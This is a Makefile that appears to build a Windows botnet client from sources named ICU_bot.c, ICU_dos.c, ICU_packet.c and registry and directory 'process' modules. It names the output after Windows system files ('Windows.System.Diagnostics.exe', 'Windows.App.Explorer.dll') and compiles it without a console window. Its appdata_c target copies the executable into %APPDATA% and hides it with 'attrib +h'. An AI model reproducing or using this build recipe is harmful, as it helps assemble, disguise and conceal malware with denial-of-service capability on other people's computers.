OUT_DIR = source
APPDATA_DIR := $(shell cmd /C echo %APPDATA%)
HOME := $(shell git rev-parse --show-toplevel)

EXPLORER_DLL = Windows.App.Explorer.dll
SCRIPT_NAME = Windows.System.Diagnostics.exe
CLEAN_SCRIPT_NAME = icuclean-x86_x64.exe

SRC_MAIN = x86_x64.c
SRC_CLEAN = clean.c
SRC_BOT = core/ICU_bot.c
SRC_LOG = stdlib/ICU_log.c
SRC_IPGEO = stdlib/ICU_ipgeo.c
SRC_ENV = stdlib/ICU_env.c
SRC_CRC = stdlib/crc.c
SRC_PACKET = stdlib/ICU_packet.c
SRC_DOS = stdlib/ICU_dos.c
SRC_RECYCLE_BIN = process/recyclebinprocess.c
SRC_WIN_REESTR = process/windowsprocess.c
SRC_DIRPROCESS = process/dirprocess.c

SRC_DLL = process/DLL/DLL_explorer.c

MAIN_OUT = "$(OUT_DIR)/$(SCRIPT_NAME)"
APPDATA_OUT = $(APPDATA_DIR)

CC = gcc
CFLAGS = -mwindows
LDFLAGS = -lws2_32
HTTPFLAGS = -lwinhttp
LAPIFLAGS = -liphlpapi
LSHELL32 = -lshell32
LOLE32  = -lole32
LUUID  = -luuid

exe: $(MAIN_OUT)

$(MAIN_OUT): $(SRC_MAIN)
	@if not exist $(OUT_DIR) mkdir $(OUT_DIR)
	$(CC) $(SRC_MAIN) -o $(MAIN_OUT) $(SRC_LOG) $(SRC_BOT) $(SRC_IPGEO) $(SRC_ENV) $(SRC_CRC) $(SRC_PACKET) $(SRC_DOS) $(SRC_WIN_REESTR) $(SRC_RECYCLE_BIN) $(SRC_DIRPROCESS) $(CFLAGS) $(LDFLAGS) $(HTTPFLAGS) $(LAPIFLAGS) $(LSHELL32) $(LOLE32) $(LUUID)

clean:
	@if not exist $(OUT_DIR) mkdir $(OUT_DIR)
	$(CC) $(SRC_CLEAN) -o "$(OUT_DIR)/$(CLEAN_SCRIPT_NAME)" $(SRC_ENV)

appdata_c:
	copy /Y "$(HOME)\sys\windows\source\$(SCRIPT_NAME)" "$(APPDATA_OUT)"
	attrib +h "$(APPDATA_OUT)\$(SCRIPT_NAME)"
appdata_d:
	del /Q "$(APPDATA_OUT)\$(SCRIPT_NAME)"

dll:
	@if not exist $(OUT_DIR) mkdir $(OUT_DIR)
	$(CC) -shared -o $(OUT_DIR)/$(EXPLORER_DLL) $(SRC_DLL) -Wall -Wextra $(LDFLAGS)
